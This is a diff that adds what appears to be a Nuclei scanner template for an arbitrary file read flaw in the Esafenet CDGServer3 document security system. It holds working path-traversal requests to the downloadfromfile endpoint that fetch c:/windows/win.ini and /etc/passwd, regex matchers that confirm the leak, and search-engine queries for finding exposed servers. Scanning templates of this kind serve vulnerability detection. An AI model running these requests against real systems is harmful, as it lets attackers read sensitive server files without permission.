@@ -1,0 +1,32 @@
+id: esafenet-cdgserver3-downloadfromfile-fileread
+
+info:
+  name: 亿赛通电子文档安全管理系统 downloadfromfile - fileread
+  author: leadlife
+  severity: high
+  description: The esafenet Document Management System is vulnerable to arbitrary file read through the `downloadfromfile` endpoint, which allows an attacker to read sensitive files from the server.
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
+    hunter-query: app.name="ESAFENET 亿赛通文档安全管理系统"
+  tags: fileread,esafenet
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/CDGServer3/downloadfromfile?fileName=c:/windows/win.ini"
+      - "{{BaseURL}}/CDGServer3/downloadfromfile?fileName=/etc/passwd"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
